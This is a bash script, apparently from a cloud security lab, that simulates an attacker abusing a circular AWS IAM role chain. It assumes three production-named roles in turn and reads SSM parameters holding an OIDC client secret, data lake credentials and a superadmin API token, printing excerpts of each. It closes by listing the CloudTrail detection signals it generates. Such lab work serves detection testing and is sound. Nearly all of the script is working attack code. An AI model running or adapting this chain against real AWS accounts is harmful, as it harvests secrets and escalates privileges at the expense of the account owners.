#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 9 (IAM Role Chain Loop)
#
# This script walks through the circular role assumption chain:
#   Role A → read SSM → assume Role B → read SSM → assume Role C → read SSM → assume Role A (loop)
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 9 — ABUSE CHAIN"
echo "  IAM Role Chain Loop"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

ROLE_A_ARN="arn:aws:iam::${ACCOUNT_ID}:role/prod-microservice-auth-role"
ROLE_B_ARN="arn:aws:iam::${ACCOUNT_ID}:role/prod-microservice-data-role"
ROLE_C_ARN="arn:aws:iam::${ACCOUNT_ID}:role/prod-microservice-admin-role"

# ---------------------------------------------------------------
step "2" "Assuming Role A: prod-microservice-auth-role"
# ---------------------------------------------------------------
attack "sts:AssumeRole → ${ROLE_A_ARN}"

CREDS_A=$(aws sts assume-role \
  --role-arn "${ROLE_A_ARN}" \
  --role-session-name "recon-auth-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "$CREDS_A" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_A" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS_A" | jq -r .SessionToken)
info "Role A assumed successfully"

# ---------------------------------------------------------------
step "3" "Reading SSM parameter: /prod/auth/oidc-config (as Role A)"
# ---------------------------------------------------------------
attack "ssm:GetParameter → /prod/auth/oidc-config"
OIDC_CONFIG=$(aws ssm get-parameter \
  --name "/prod/auth/oidc-config" \
  --query "Parameter.Value" \
  --output text \
  --region us-west-2)
info "Retrieved OIDC config"
echo ""
echo -e "${YELLOW}--- OIDC Config (excerpt) ---${NC}"
echo "$OIDC_CONFIG" | jq '{provider: .provider, client_id: .client_id, client_secret: .client_secret, service_account: .service_account.username}'
echo ""

# ---------------------------------------------------------------
step "4" "Assuming Role B: prod-microservice-data-role (from Role A)"
# ---------------------------------------------------------------
attack "sts:AssumeRole → ${ROLE_B_ARN}"

CREDS_B=$(aws sts assume-role \
  --role-arn "${ROLE_B_ARN}" \
  --role-session-name "recon-data-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "$CREDS_B" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_B" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS_B" | jq -r .SessionToken)
info "Role B assumed successfully"

# ---------------------------------------------------------------
step "5" "Reading SSM parameter: /prod/data/lake-credentials (as Role B)"
# ---------------------------------------------------------------
attack "ssm:GetParameter → /prod/data/lake-credentials"
LAKE_CREDS=$(aws ssm get-parameter \
  --name "/prod/data/lake-credentials" \
  --query "Parameter.Value" \
  --output text \
  --region us-west-2)
info "Retrieved data lake credentials"
echo ""
echo -e "${YELLOW}--- Lake Credentials (excerpt) ---${NC}"
echo "$LAKE_CREDS" | jq '{endpoint: .data_lake.endpoint, redshift_host: .redshift.host, redshift_user: .redshift.username, access_key_id: .service_account.access_key_id}'
echo ""

# ---------------------------------------------------------------
step "6" "Assuming Role C: prod-microservice-admin-role (from Role B)"
# ---------------------------------------------------------------
attack "sts:AssumeRole → ${ROLE_C_ARN}"

CREDS_C=$(aws sts assume-role \
  --role-arn "${ROLE_C_ARN}" \
  --role-session-name "recon-admin-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "$CREDS_C" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_C" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS_C" | jq -r .SessionToken)
info "Role C assumed successfully"

# ---------------------------------------------------------------
step "7" "Reading SSM parameter: /prod/admin/console-credentials (as Role C)"
# ---------------------------------------------------------------
attack "ssm:GetParameter → /prod/admin/console-credentials"
CONSOLE_CREDS=$(aws ssm get-parameter \
  --name "/prod/admin/console-credentials" \
  --query "Parameter.Value" \
  --output text \
  --region us-west-2)
info "Retrieved admin console credentials"
echo ""
echo -e "${YELLOW}--- Console Credentials (excerpt) ---${NC}"
echo "$CONSOLE_CREDS" | jq '{url: .admin_console.url, username: .superadmin.username, api_token: .superadmin.api_token}'
echo ""

# ---------------------------------------------------------------
step "8" "Completing the loop — assuming Role A again (from Role C)"
# ---------------------------------------------------------------
warn "Role C can assume Role A — the chain loops back to the start!"
attack "sts:AssumeRole → ${ROLE_A_ARN} (loop detected)"

CREDS_LOOP=$(aws sts assume-role \
  --role-arn "${ROLE_A_ARN}" \
  --role-session-name "recon-loop-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "$CREDS_LOOP" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_LOOP" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS_LOOP" | jq -r .SessionToken)
info "Role A assumed again — attacker is trapped in the loop"

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "9" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on prod-microservice-auth-role (x2)"
echo "  • CloudTrail: AssumeRole on prod-microservice-data-role"
echo "  • CloudTrail: AssumeRole on prod-microservice-admin-role"
echo "  • CloudTrail: GetParameter on /prod/auth/oidc-config"
echo "  • CloudTrail: GetParameter on /prod/data/lake-credentials"
echo "  • CloudTrail: GetParameter on /prod/admin/console-credentials"
echo ""
echo -e "${YELLOW}Chain path:${NC}"
echo "  A (auth) → B (data) → C (admin) → A (auth) [LOOP]"
echo ""
